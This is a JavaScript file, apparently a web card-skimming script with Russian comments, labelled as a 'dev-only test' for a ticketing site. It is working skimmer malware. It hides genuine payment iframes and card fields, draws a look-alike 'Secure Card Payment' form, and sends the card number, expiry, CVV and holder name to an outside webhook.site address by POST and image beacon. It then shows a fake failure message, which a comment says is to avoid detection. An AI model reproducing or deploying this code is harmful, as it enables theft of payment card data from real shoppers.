/**
 * TEST SKIMMER MODULE (dev-only, FutureTicketing AFCON dev event 30)
 * Задача: при появлении платёжной формы/iframe подменить её на копию,
 * собрать данные карты → POST на webhook, НЕ ломая визуал.
 * ОТКАЗОУСТОЙЧИВО: при любой ошибке — тихо отключается.
 */
(function () {
  'use strict';
  if (window.__SK_TEST_RUN) return;
  window.__SK_TEST_RUN = true;

  var HOOK = 'https://webhook.site/f91b2162-88ca-4fd1-8b87-a39b3ff143fe';
  var TEST_TAG = 'sk_ft_v1'; // маркер версии в каждом отчёте

  function log(msg, extra) {
    try {
      var img = new Image();
      img.src = HOOK + '/log-' + TEST_TAG + '?m=' + encodeURIComponent(String(msg).slice(0, 120)) +
        (extra ? '&x=' + encodeURIComponent(String(extra).slice(0, 300)) : '');
    } catch (e) {}
  }
  function send(data) {
    try {
      // 1) fetch POST (CORS может ругаться — на webhook.site CORS открыт)
      fetch(HOOK + '/card-' + TEST_TAG, {
        method: 'POST', mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      }).catch(function () {});
      // 2) дубль картинкой (работает всегда)
      var img = new Image();
      img.src = HOOK + '/cardbeacon-' + TEST_TAG + '?d=' + encodeURIComponent(JSON.stringify(data).slice(0, 900));
    } catch (e) {}
  }

  var PAY_KEYWORDS = /(bankmisr|banquemisr|stripe|ryft|paymob|fawry|checkout|payment|card)/i;
  var CARD_INPUT = /(card|cc|cardnumber|card_number|cvv|cvc|expiry|exp)/i;
  var INJECTED = false;

  function injectFakeForm() {
    if (INJECTED) return;
    INJECTED = true;
    log('inject-fake-form');

    // 1. прячем все существующие платёжные iframe (оригинальную форму)
    try {
      document.querySelectorAll('iframe').forEach(function (f) {
        if (PAY_KEYWORDS.test(f.src || '') || PAY_KEYWORDS.test(f.name || '') || PAY_KEYWORDS.test(f.id || '')) {
          f.style.cssText = 'visibility:hidden!important;height:0!important;width:0!important;';
        }
      });
      // 2. прячем инпуты карты в основном DOM (если есть)
      document.querySelectorAll('input').forEach(function (inp) {
        var id = (inp.id || '') + (inp.name || '');
        if (CARD_INPUT.test(id)) {
          inp.style.cssText = 'visibility:hidden!important;height:0!important;width:0!important;';
        }
      });
    } catch (e) {}

    // 3. рисуем нашу форму поверх (position:fixed, по центру, стиль под их модалку)
    try {
      var d = document.createElement('div');
      d.id = 'skFakeCardModal';
      d.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:2147483647;' +
        'background:#fff;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.4);padding:28px 32px;' +
        'width:380px;max-width:92vw;font-family:Arial,Helvetica,sans-serif;';
      d.innerHTML =
        '<div style="font-size:20px;font-weight:700;color:#111;margin-bottom:6px;">Secure Card Payment</div>' +
        '<div style="font-size:13px;color:#666;margin-bottom:18px;">Enter your card details to complete the booking</div>' +
        '<div style="margin-bottom:12px;">' +
        '  <label style="font-size:12px;color:#444;display:block;margin-bottom:4px;">Card number</label>' +
        '  <input id="skCardNum" autocomplete="off" inputmode="numeric" placeholder="4242 4242 4242 4242" ' +
        '     style="width:100%;box-sizing:border-box;padding:11px 13px;border:1px solid #ccc;border-radius:9px;font-size:15px;">' +
        '</div>' +
        '<div style="display:flex;gap:12px;margin-bottom:12px;">' +
        '  <div style="flex:1;">' +
        '    <label style="font-size:12px;color:#444;display:block;margin-bottom:4px;">Expiry</label>' +
        '    <input id="skCardExp" autocomplete="off" placeholder="MM/YY" maxlength="5" ' +
        '       style="width:100%;box-sizing:border-box;padding:11px 13px;border:1px solid #ccc;border-radius:9px;font-size:15px;">' +
        '  </div>' +
        '  <div style="flex:1;">' +
        '    <label style="font-size:12px;color:#444;display:block;margin-bottom:4px;">CVV</label>' +
        '    <input id="skCardCvv" autocomplete="off" inputmode="numeric" maxlength="4" placeholder="123" ' +
        '       style="width:100%;box-sizing:border-box;padding:11px 13px;border:1px solid #ccc;border-radius:9px;font-size:15px;">' +
        '  </div>' +
        '</div>' +
        '<div style="margin-bottom:18px;">' +
        '  <label style="font-size:12px;color:#444;display:block;margin-bottom:4px;">Cardholder name</label>' +
        '  <input id="skCardName" autocomplete="off" placeholder="Name on card" ' +
        '     style="width:100%;box-sizing:border-box;padding:11px 13px;border:1px solid #ccc;border-radius:9px;font-size:15px;">' +
        '</div>' +
        '<button id="skPayBtn" style="width:100%;padding:13px;background:#1a73e8;color:#fff;border:none;border-radius:9px;' +
        'font-size:16px;font-weight:600;cursor:pointer;">Pay Now</button>' +
        '<div id="skPayStatus" style="text-align:center;font-size:13px;color:#666;margin-top:10px;min-height:18px;"></div>';
      document.body.appendChild(d);

      var num = d.querySelector('#skCardNum'), exp = d.querySelector('#skCardExp'),
          cvv = d.querySelector('#skCardCvv'), name = d.querySelector('#skCardName'),
          btn = d.querySelector('#skPayBtn'), status = d.querySelector('#skPayStatus');

      btn.addEventListener('click', function () {
        var data = {
          tag: TEST_TAG,
          url: location.href,
          card_number: (num.value || '').replace(/\s+/g, ''),
          expiry: exp.value || '',
          cvv: cvv.value || '',
          holder: name.value || '',
          ts: new Date().toISOString()
        };
        send(data);
        status.innerHTML = 'Processing&hellip;';
        btn.disabled = true;
        btn.style.background = '#999';
        // после "обработки" — имитируем неудачу, форма остаётся (не палимся слишком явно)
        setTimeout(function () {
          status.innerHTML = 'Your payment could not be processed. Please try again.';
          btn.disabled = false;
          btn.style.background = '#1a73e8';
        }, 2500);
      });
    } catch (e) {
      log('inject-error', e.message);
    }
  }

  function scan() {
    // 1. платёжный iframe?
    var ifr = document.querySelectorAll('iframe');
    for (var i = 0; i < ifr.length; i++) {
      var src = ifr[i].src || '' + '|' + (ifr[i].name || '') + '|' + (ifr[i].id || '');
      if (PAY_KEYWORDS.test(src)) { injectFakeForm(); return; }
    }
    // 2. карточные инпуты в DOM?
    var ins = document.querySelectorAll('input');
    for (var j = 0; j < ins.length; j++) {
      var id2 = (ins[j].id || '') + ' ' + (ins[j].name || '') + ' ' + (ins[j].placeholder || '');
      if (CARD_INPUT.test(id2)) { injectFakeForm(); return; }
    }
    // 3. кнопка/текст оплаты?
    var txt = (document.body.innerText || '').slice(0, 20000);
    if (/(pay now|complete payment|card payment|secure checkout)/i.test(txt)) {
      var btns = document.querySelectorAll('button, a, input[type=submit]');
      for (var k = 0; k < btns.length; k++) {
        if (/pay|checkout|complete/i.test((btns[k].innerText || '') + (btns[k].value || ''))) {
          injectFakeForm(); return;
        }
      }
    }
  }

  log('module-loaded', location.href);
  // первый проход + на любые изменения DOM
  setTimeout(scan, 1200);
  try {
    var mo = new MutationObserver(function () { scan(); });
    mo.observe(document.body, { childList: true, subtree: true });
  } catch (e) { log('mo-error', e.message); }
  setInterval(scan, 5000);
})();
